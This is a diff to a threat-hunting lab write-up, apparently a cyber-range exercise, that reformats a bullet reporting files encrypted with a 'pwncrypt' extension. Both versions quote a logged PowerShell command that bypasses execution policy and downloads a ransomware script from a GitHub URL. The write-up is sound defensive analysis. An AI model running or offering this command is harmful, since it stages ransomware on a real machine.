@@ -46,7 +46,8 @@ DeviceFileEvents
 
 I ran a query that revealed several files created with the “pwncrypt” extension.
 - Files: `1308_EmployeeRecords_pwncrypt.csv``6664_ProjectList_pwncrypt.csv``2669_CompanyFinancials_pwncrypt.csv`.
-- Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1` The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `), then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`) and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
+- Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
+  - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1` The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `), then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`) and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
 
 **Query used to locate events:**
 ```kql
